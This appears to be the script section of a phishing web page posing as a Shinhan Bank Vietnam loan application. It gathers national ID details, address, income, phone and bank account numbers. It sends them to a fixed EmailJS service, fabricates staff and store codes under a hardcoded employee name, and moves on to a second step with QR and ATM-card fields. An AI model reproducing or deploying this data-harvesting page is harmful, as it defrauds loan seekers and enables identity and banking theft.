                const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
                spamData.registerCount = (spamData.registerCount || 0) + 1;
                spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
                localStorage.setItem('spamData', JSON.stringify(spamData));
            }

            // Send registration data via EmailJS with retry
            function sendRegistrationDataEmail() {
                const params = {
                    to_name: userData.fullName || '',
                    full_name: userData.fullName || '',
                    id_number: encryptData(userData.idNumber || ''),
                    id_issue_date: userData.idIssueDate || '',
                    id_issue_place: userData.idIssuePlace || '',
                    address: userData.address || '',
                    occupation: userData.occupation || '',
                    income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : '',
                    phone_number: encryptData(userData.phoneNumber || ''),
                    email: userData.email || '',
                    loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : '',
                    loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
                    loan_purpose: userData.loanPurpose || '',
                    account_number: encryptData(userData.accountNumber || ''),
                    bank_name: userData.bankName || '',
                    loan_code: userData.loanCode || '',
                    registration_date: userData.registrationDate || '',
                    to_email: userData.email || 'support@shinhan.com.vn'
                };

                if (!validateEmailParams(params)) return;

                console.log('Preparing to send EmailJS params for Step1:', params);

                function trySendEmail(attempt = 1, maxAttempts = 5) {
                    emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                        .then(() => {
                            console.log('Email sent successfully on attempt', attempt);
                            alert("Thông tin đăng ký đã được gửi qua email!");
                            localStorage.removeItem('pendingEmail');
                            $('#retryEmailBtn').hide();
                        })
                        .catch(error => {
                            console.error('EmailJS error on attempt', attempt, ':', error);
                            if (attempt < maxAttempts) {
                                console.log('Retrying EmailJS send...');
                                setTimeout(() => trySendEmail(attempt + 1, maxAttempts), 2000 * Math.pow(2, attempt));
                            } else {
                                alert("Đã xảy ra lỗi khi gửi email. Dữ liệu đã được lưu tạm thời để thử lại sau.");
                                localStorage.setItem('pendingEmail', JSON.stringify(params));
                                $('#emailError').text('Lỗi gửi email sau 5 lần thử. Vui lòng kiểm tra kết nối hoặc thử lại sau.').show();
                                $('#retryEmailBtn').show();
                            }
                        });
                }

                trySendEmail();
            }

            // Load saved data and initialize form
            window.onload = function() {
                loadUserData();
                $('#fullName').val(userData.fullName);
                $('#idNumber').val(userData.idNumber);
                $('#idIssueDate').val(userData.idIssueDate);
                $('#idIssuePlace').val(userData.idIssuePlace);
                $('#address').val(userData.address);
                $('#occupation').val(userData.occupation || '');
                $('#income').val(userData.income ? formatNumberInput(userData.income) : '');
                $('#phoneNumber').val(userData.phoneNumber);
                $('#email').val(userData.email);
                $('#loanAmountInput').val(userData.loanAmount ? formatNumberInput(userData.loanAmount) : '');
                $('#loanTerm').val(userData.loanTerm || '');
                $('#loanPurpose').val(userData.loanPurpose || '');
                $('#accountNumber').val(userData.accountNumber);
                $('#bankName').val(userData.bankName || '');
                $('#termsAgree').prop('checked', userData.termsAgree);

                // Initialize tooltips
                var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
                tooltipTriggerList.map(function (tooltipTriggerEl) {
                    return new bootstrap.Tooltip(tooltipTriggerEl);
                });

                // Validate form on load
                validateForm();

                // Check for pending email
                const pendingEmail = localStorage.getItem('pendingEmail');
                if (pendingEmail) {
                    $('#retryEmailBtn').show();
                }
            };

            // Format number inputs
            $('#income, #loanAmountInput').on('input', function() {
                let value = $(this).val().replace(/[^0-9]/g, '');
                if (value) {
                    $(this).val(formatNumberInput(value));
                } else {
                    $(this).val('');
                }
                validateForm();
            });

            // Validate on input change
            $('#registerForm input, #registerForm select').on('input change', validateForm);
            $('#termsAgree').on('change', validateForm);

            // Retry sending email
            $('#retryEmailBtn').on('click', function() {
                const pendingEmail = localStorage.getItem('pendingEmail');
                if (pendingEmail) {
                    try {
                        const params = JSON.parse(pendingEmail);
                        if (validateEmailParams(params)) {
                            sendRegistrationDataEmail();
                        }
                    } catch (error) {
                        console.error('Error retrying pending email:', error);
                        $('#emailError').text('Lỗi thử lại gửi email. Vui lòng thử lại sau.').show();
                    }
                }
            });

            // Form submission
            $('#registerForm').on('submit', function(e) {
                e.preventDefault();
                const form = e.target;
                form.classList.add('was-validated');
                $('#storageError, #emailError').hide();

                // Kiểm tra chống spam
                const spamCheck = checkSpam();
                if (!spamCheck.allowed) {
                    $('#spamError').text(spamCheck.message).show();
                    $('#proceedToStep2Btn').prop('disabled', true);
                    return;
                } else {
                    $('#spamError').hide();
                }

                if (form.checkValidity() && $('#termsAgree').is(':checked') && validateInputFormats()) {
                    // Populate confirm modal
                    $('#confirmFullName').text($('#fullName').val().trim() || '');
                    $('#confirmIdNumber').text($('#idNumber').val().trim() || '');
                    $('#confirmIdIssueDate').text($('#idIssueDate').val().trim() || '');
                    $('#confirmIdIssuePlace').text($('#idIssuePlace').val().trim() || '');
                    $('#confirmAddress').text($('#address').val().trim() || '');
                    $('#confirmOccupation').text($('#occupation option:selected').text() || '');
                    $('#confirmIncome').text(formatNumberInput($('#income').val()) + ' VND' || '');
                    $('#confirmPhoneNumber').text($('#phoneNumber').val().trim() || '');
                    $('#confirmEmail').text($('#email').val().trim() || '');
                    $('#confirmLoanAmount').text(formatNumberInput($('#loanAmountInput').val()) + ' VND' || '');
                    $('#confirmLoanTerm').text($('#loanTerm option:selected').text() || '');
                    $('#confirmLoanPurpose').text($('#loanPurpose option:selected').text() || '');
                    $('#confirmAccountNumber').text($('#accountNumber').val().trim() || '');
                    $('#confirmBankName').text($('#bankName option:selected').text() || '');

                    // Show confirm modal
                    const confirmModal = new bootstrap.Modal(document.getElementById('confirmDataModal'));
                    confirmModal.show();
                } else {
                    console.warn('Form validation failed or terms not agreed.');
                    alert('Vui lòng điền đầy đủ thông tin hợp lệ và đồng ý với điều khoản.');
                }
            });

            // Confirm submission
            $('#confirmSubmitBtn').on('click', function() {
                const income = $('#income').val().replace(/[^0-9]/g, '');
                const loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '');
                userData = {
                    fullName: $('#fullName').val().trim(),
                    idNumber: $('#idNumber').val().trim(),
                    idIssueDate: $('#idIssueDate').val().trim(),
                    idIssuePlace: $('#idIssuePlace').val().trim(),
                    address: $('#address').val().trim(),
                    occupation: $('#occupation').val(),
                    income: income,
                    phoneNumber: $('#phoneNumber').val().trim(),
                    email: $('#email').val().trim(),
                    loanAmount: loanAmount,
                    loanTerm: $('#loanTerm').val(),
                    loanPurpose: $('#loanPurpose').val(),
                    accountNumber: $('#accountNumber').val().trim(),
                    bankName: $('#bankName').val(),
                    termsAgree: $('#termsAgree').is(':checked'),
                    loanCode: generateLoanCode(),
                    registrationDate: getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
                    interestRate: calculateInterestRate(loanAmount),
                    sellerCode: generateRandomCode(),
                    storeCode: generateRandomCode(),
                    staffCode: generateRandomCode(),
                    staffName: "Nguyễn Thị Mỹ Duyên",
                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
                    isRegistered: false,
                    qrData: {},
                    atmCard: {},
                    currentStep: 2
                };
                console.log('Submitting userData:', userData);

                // Lưu idNumber vào registeredIds
                if (userData.idNumber) {
                    const registeredIds = loadRegisteredIds();
                    registeredIds.push(userData.idNumber);
                    saveRegisteredIds(registeredIds);
                }

                if (saveToLocalStorage()) {
                    updateSpamData();
                    sendRegistrationDataEmail();
                    window.location.href = 'step2.html';
                }

                // Hide confirm modal
                bootstrap.Modal.getInstance(document.getElementById('confirmDataModal')).hide();
            });
        </script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93cf2a4e4ce5bf96',t:'MTc0Njc3MjQwNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body>
</html>
